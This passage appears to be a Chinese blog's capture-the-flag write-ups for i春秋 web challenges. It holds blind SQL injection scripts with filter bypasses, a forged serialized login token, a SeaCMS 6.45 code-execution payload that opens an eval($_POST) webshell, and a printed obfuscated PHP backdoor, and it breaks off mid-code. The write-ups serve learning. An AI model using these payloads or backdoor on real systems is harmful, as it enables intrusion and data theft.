<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210211153724.png" alt="img"></p>
<p>啥？没密码？直接flag了吗，那就继续吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*&#123;&#125;[],，&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(substr((selselectect column_name from information_schema.columns where table_name=&#x27;fl4g&#x27; limit 0,1),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)-&#x27;#&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;name&#x27;</span>: payload,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u5728&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            password += j</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>拿到字段名：<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210211154038.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*&#123;&#125;[],，&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(substr((seselectlect flag from fl4g limit 0,1),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)-&#x27;#&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;name&#x27;</span>: payload,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u5728&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            password += j</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>拿到flag<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210211154825.png" alt="img"></p>
<p>感觉没啥难度，唯一卡壳的地方就是一个开始的fuzz过滤看反了，以为select是没过滤的，其他全过滤了，后来发现其实不是滴</p>
<h1 id="web-SQLI"><a href="#web-SQLI" class="headerlink" title="web-SQLI"></a>web-SQLI</h1><p>看到提示说有login.php，所以就打开了，发现尝试了很多注入姿势都不对，于是再去找线索，看了一下wp发现原来是l0gin.php==<br>后来去看了一下 为啥是l0gin.php，说是经验吧。。。。可能确实需要多积累吧，就像之前那个备份文件泄露一样</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216150817.png" alt="img"></p>
<p>在进行sql注入的时候，发现输入的内容会显示在id中，当我输入逗号的时候，逗号以后的内容就不会被显示此时有两种解决方法：<br>1.寻找代替逗号的符号<br>2.编写盲注脚本，因为发现，如果是正确的后面的username是会现实的，通过后面的-1-以及-0-可以看出<br>先尝试一下方法1吧:</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;union select * from ((select group_contat(table_name) from information_schema.tables where table_schema&#x3D;database())a join (select user())b) %23</span><br><span class="line">?id&#x3D;-1&#39;union select * from ((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)a join (select user())b) %23</span><br><span class="line">?id&#x3D;-1&#39;union select * from ((select flag_9c861b688330 from users)a join (select user())b) %23</span><br></pre></td></tr></table></figure>

<p>这里使用的是join代替逗号，需要注意的是，join内容的类型需要一样，其次后面需要加一个字符，然后这里的注释符很奇怪，在这里卡了很久 不能使用–+ 但是可以用%23或者 – -<br>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://6f89d5298bc448ac8af388b5a68da444863034a569d8481a.changame.ichunqiu.com/l0gin.php?id=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*&#123;&#125;[],，&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;1&#x27;-(mid((database())from(-<span class="subst">&#123;i&#125;</span>))=&#x27;<span class="subst">&#123;j&#125;</span><span class="subst">&#123;password&#125;</span>&#x27;)-&#x27;&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="comment">#print(s.get(url+payload).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> s.get(url+payload,headers=headers).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)<span class="comment">#可不用，是用来调试的</span></span><br><span class="line">            password += j</span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这个盲注脚本的语句依旧是沿用之前的，当我在burp suit测试的时候，语句是可以使用的，但是当我放到pycharm跑的时候永远只有一条信息，推测是被拦截了。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218123927.png" alt="img" style="zoom:67%;"><br>最后flag就出来了</p>
<p>绕过参考：<a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E5%AF%B9%E9%80%97%E5%8F%B7-%E7%9A%84%E8%BF%87%E6%BB%A4">https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E5%AF%B9%E9%80%97%E5%8F%B7-%E7%9A%84%E8%BF%87%E6%BB%A4</a></p>
]]></content>
  </entry>
  <entry>
    <title>i春秋3</title>
    <url>/2021/02/12/i%E6%98%A5%E7%A7%8B3/</url>
    <content><![CDATA[<h2 id="web——borken"><a href="#web——borken" class="headerlink" title="web——borken"></a>web——borken</h2><p>这里一打开，出现很多</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212130032.png" alt="img" style="zoom:67%;">

<p>这个东西，我也不知道是啥，于是就去看了一下wp发现是JSFUCK，是一种编程语言，所以学习一下：         <a id="more"></a><br>JSFUCK:JSFuck 可以让你只用 6 个字符<code>[]()!+</code>来编写 JavaScript 程序。</p>
<p>我看看能不能解密，将页面上的JSFUCK拿去解码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212131643.png" alt="img" style="zoom:67%;"><br>发现最上面少而另一]，将它补齐后在下面窗口运行，弹出:<br>flag not here<br>看到这么多的奇怪字符，我觉得好痛苦，看了WP有两种方法，一种是对照找出flag在这些代码中放置的位置，第二种是:上面那段代码的原理其实很简单，它使用了Function关键字定义一个匿名函数，并立即执行了。</p>
<p>如果我们在浏览器敲入下面代码，也会弹出数字“1”：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span>(<span class="params"><span class="string">&quot;alert(1)&quot;</span></span>)(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure>

<p>该段代码最后()代表的是函数的结尾，所以只要把最后这个括号删掉就不会弹框了，然后一开始补齐的代码，也需要一起删除，这样才能显示被掩盖的结果</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212161605.png" alt="img" style="zoom:67%;">

<h2 id="web-who-are-you"><a href="#web-who-are-you" class="headerlink" title="web-who are you"></a>web-who are you</h2><p>打开页面 说没有权限，于是抓包看看有没有什么修改权限地方<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212202050.png" alt="img"><br>看起来像是加密了，所以base64试着解码一下，得到<br><code>f:5:&quot;thrfg&quot;;</code>接下来就触及了知识盲区了<br>原来以上的内容又使用了rot13加密，所以解密完以后变成<br>s:5:”guest”，更改为admin，再去重新加密试试<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212202415.png" alt="img" style="zoom:67%;"><br>她现在让我们上传东西了，但是却没有上传的框框，看到这里是要POST上传的</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212203425.png" alt="img" style="zoom:67%;">
试了几种一句话木马都被过滤了，后来实在想不到了，看了一下WP，原来--可以用输入**数组的方式**进行绕过检查大概算是一种经验吧，积累一波
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210212205134.png" alt="img" style="zoom:67%;">

<p>但是当我打开这个文件夹的时候啥都没有–，用扫描目录的工具扫了一波 都没发现存在这个目录，，，阿这挺无语的</p>
<h2 id="web——Login"><a href="#web——Login" class="headerlink" title="web——Login"></a>web——Login</h2><p>在下面审查元素找到一个类似于账号密码的东西，输入进去登录后得到一个很奇怪的表情人傻了，但是其他信息也没有，burpsuit抓包试试，也没发现什么有用的东西=-=，但是有一个show的参数 去看了一下wp，这个show好像是关键的东西，然后回来，修改了一下show的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);<span class="comment">//从这几个地方获取$requset的值</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">db</span> //定义类</span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $where;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)//定义函数</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$where</span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			$sql = mysql_query(<span class="string">&#x27;select * from user where &#x27;</span>.$where);</span><br><span class="line">			<span class="keyword">return</span> @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">&#x27;token&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">&#x27;token&#x27;</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">&#x27;user=\&#x27;&#x27;</span>.mysql_real_escape_string($login[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">&#x27;user&#x27;</span>] === <span class="string">&#x27;ichunqiu&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>] !== $login[<span class="string">&#x27;pass&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;unserialize injection!!&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;(╯‵□′)╯︵┴─┴ &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: index.php?error=1&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把show改为1就出现了如上源码：<br>接下来要审计一波这个源码–头已经开始晕了<br>仔细看了一下也没啥，主要是这个类和函数的定义绕来绕去的，其实就是要从库里select 出一个user=ichunqiu的，但是考虑到库里可能没有这个值，所以这里要我们自己去赋值，所以我们转化的不是单纯的<code>‘ichunqiu’</code>而是赋予user这一个键键值为ichunqiu<br><code>&#39;user&#39;-&gt;&#39;ichunqiu&#39;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span>=&gt;<span class="string">&#x27;ichunqiu&#x27;</span>);</span><br><span class="line">$b = base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $b</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>转化结果，然后再cookie添加token为以上值就行<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210213145623.png" alt="img" style="zoom:67%;"><br>这样就可以得到flag了<br><code>flag&#123;5db96a12-b37c-44e3-8152-cdd30455bae2&#125;</code></p>
<h2 id="web——海洋cms漏洞"><a href="#web——海洋cms漏洞" class="headerlink" title="web——海洋cms漏洞"></a>web——海洋cms漏洞</h2><p>隔了好几天了，看不下去这个漏洞，操作什么的倒是很好模仿，但是对于原理的理解就比较磨人了，今天发誓一定要好好学完！</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>这里主要说一下6.45的代码任意执行漏洞，在这个漏洞中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; ......    $content = str_replace(<span class="string">&quot;&#123;searchpage:page&#125;&quot;</span>,$page,$content);    	$content = str_replace(<span class="string">&quot;&#123;seacms:searchword&#125;&quot;</span>,$searchword,$content);    $content = str_replace(<span class="string">&quot;&#123;seacms:searchnum&#125;&quot;</span>,$TotalResult,$content);    	$content = str_replace(<span class="string">&quot;&#123;searchpage:ordername&#125;&quot;</span>,$order,$content); ......    $content = str_replace(<span class="string">&quot;&#123;searchpage:year&#125;&quot;</span>,$year,$content);    	$content = str_replace(<span class="string">&quot;&#123;searchpage:area&#125;&quot;</span>,$area,$content);    $content = str_replace(<span class="string">&quot;&#123;searchpage:letter&#125;&quot;</span>,$letter,$content);    	$content = str_replace(<span class="string">&quot;&#123;searchpage:lang&#125;&quot;</span>,$yuyan,$content);    $content = str_replace(<span class="string">&quot;&#123;searchpage:jq&#125;&quot;</span>,$jq,$content);    ......    	$content = str_replace(<span class="string">&quot;&#123;searchpage:state&#125;&quot;</span>,$state2,$content);    $content = str_replace(<span class="string">&quot;&#123;searchpage:money&#125;&quot;</span>,$money2,$content);    	$content = str_replace(<span class="string">&quot;&#123;searchpage:ver&#125;&quot;</span>,$ver,$content); ......    $content=$mainClassObj-&gt;parseIf($content);</span><br></pre></td></tr></table></figure>

<p><strong>str_replace()函数</strong>：将content里面的searchpage换成前面一个变量中的</p>
<p>代码中对html中的searchpage标签进行了多次替换，而攻击者也正是利用了这一点，在多次替换过程中使多个参数共同组合成最终的payload，这样既绕开了RemoveXSS的过滤又绕过了20字节的长度限制。，在经过多次的替换后，此时的content已经变成了包含了我们原本的恶意语句<br>例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&#125;&amp;year&#x3D;:e&#123;searchpage:area&#125;&#125;&amp;area&#x3D;v&#123;searchpage:letter&#125;&amp;letter&#x3D;al&#123;searchpage:lang&#125;&amp;yuyan&#x3D;(join&#123;searchpage:jq&#125;&amp;jq&#x3D;($_P&#123;searchpage:ver&#125;&amp;&amp;ver&#x3D;OST[9]))&amp;9[]&#x3D;ph&amp;9[]&#x3D;pinfo();</span><br></pre></td></tr></table></figure>

<p>当我们在url中输入以上内容，经过多次的替换后，最终的content已经变成一下内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if:eval(join($_POST[9]))</span><br></pre></td></tr></table></figure>

<p>而在parself函数中，如果判断出含有if:标签，则会使用eval函数来执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span>(<span class="params">$content</span>)</span>&#123;    		</span><br><span class="line"><span class="keyword">if</span> (strpos($content,<span class="string">&#x27;&#123;if:&#x27;</span>)=== <span class="literal">false</span>)&#123; </span><br><span class="line">                    <span class="keyword">return</span> $content;    		</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> ......    		</span><br><span class="line">@<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span>.$strIf.<span class="string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>知道这些原理后<br>在URL当中构建:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ef7204bb29d84b7b82022457450f9e2b21aaa4cb0d4d4570.changame.ichunqiu.com&#x2F;search.php?searchtype&#x3D;5&amp;tid&#x3D;&amp;letter&#x3D;eval($_POST[9])</span><br></pre></td></tr></table></figure>

<p>此时就可以用蚁剑连接该链接，密码是9<br>为什么蚁剑可以直接连接了呢？经过多次替换后，在最后的if语句中 会执行<code>eval($_POST[9])</code>此命令，就相当于我们通过URL在一个php文件中插入了一句话木马，打开此URL就相当于执行了该木马。找了一下， 找到了那个search.php，决定等会还好好审计一波，然后再看了一下，说是flag在数据库中，于是找到数据库的配置文件，连接后查找即可找到flag</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216100431.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数据库连接信息</span></span><br><span class="line">$cfg_dbhost = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$cfg_dbname = <span class="string">&#x27;seacms&#x27;</span>;</span><br><span class="line">$cfg_dbuser = <span class="string">&#x27;sea_user&#x27;</span>;</span><br><span class="line">$cfg_dbpwd = <span class="string">&#x27;46e06533407e&#x27;</span>;</span><br><span class="line">$cfg_dbprefix = <span class="string">&#x27;sea_&#x27;</span>;</span><br><span class="line">$cfg_db_language = <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216100343.png" alt="img" style="zoom: 50%;">

]]></content>
  </entry>
  <entry>
    <title>posti春秋11</title>
    <url>/2021/03/05/i%E6%98%A5%E7%A7%8B11/</url>
    <content><![CDATA[<h2 id="web——backdoor"><a href="#web——backdoor" class="headerlink" title="web——backdoor"></a>web——backdoor</h2><p>他说有源码泄露，就先试试git泄漏，<br><a href="http://8f5271da775d49a7a0166a25cc5c836e795e8d00fc0044de.changame.ichunqiu.com/Challenges/.git/%EF%BC%8C%E5%9C%A8githack%E4%B8%AD%E5%B0%B1%E6%89%AB%E5%87%BA%E6%9D%A5%E4%B8%89%E4%B8%AA%E6%B2%A1%E5%95%A5%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%90%8E%E6%9D%A5%E5%8F%88%E8%AF%95%E4%BA%86%E4%B8%80%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E7%9B%AE%E5%BD%95%EF%BC%8C%E9%83%BD%E6%B2%A1%E6%9C%89%E6%94%B6%E8%8E%B7%EF%BC%8C%E7%9C%8B%E4%BA%86%E4%B8%80%E4%B8%8Bwp%EF%BC%8C%E6%89%8D%E7%9F%A5%E9%81%93%E8%BF%99%E9%87%8C%E6%B6%89%E5%8F%8A%E5%88%B0.git%E6%96%87%E4%BB%B6%E7%9A%84%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E4%BD%BF%E7%94%A8GitHack%E9%9C%80%E8%A6%81%E6%9B%B4%E9%BA%BB%E7%83%A6%E7%9A%84%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8Git_Extract">http://8f5271da775d49a7a0166a25cc5c836e795e8d00fc0044de.changame.ichunqiu.com/Challenges/.git/，在githack中就扫出来三个没啥用的文件，后来又试了一下常见的网站备份目录，都没有收获，看了一下wp，才知道这里涉及到.git文件的历史文件，也就是修改之前的文件，使用GitHack需要更麻烦的修改，所以这里使用Git_Extract</a><a id="more"></a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210305123618.png" alt="img" style="zoom:67%;">
在一个个打开看之后得到：

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;true_flag_is_in_the_b4ckdo0r.php&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后她说让我们找code，猜测这次应该就是网站的备份文件了，但是试了一圈下来，都没找到，发现是.swo后缀。。。。下载下来后改后缀用kali打开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;can you find the source code of me?&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span>$h=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$H=<span class="string">&#x27;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$N=<span class="string">&#x27;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$u=<span class="string">&#x27;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$f=<span class="string">&#x27;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$O=<span class="string">&#x27;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$w=<span class="string">&#x27;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$P=<span class="string">&#x27;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$i=<span class="string">&#x27;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$x=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$y=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$c=<span class="string">&#x27;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$L=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$v=$y(<span class="string">&#x27;&#x27;</span>,$L);$v();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="keyword">echo</span>($L);<span class="comment">//这一句是为了得到$L加上去的，恢复得到的文件中并没有</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$kh=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span></span><br><span class="line"><span class="function"></span>&#123;   $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++)</span><br><span class="line">           &#123;</span><br><span class="line">             $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> $o; &#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra)</span><br><span class="line">&#123;</span><br><span class="line">   $u=parse_url($rr);<span class="comment">#parse_url()本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</span></span><br><span 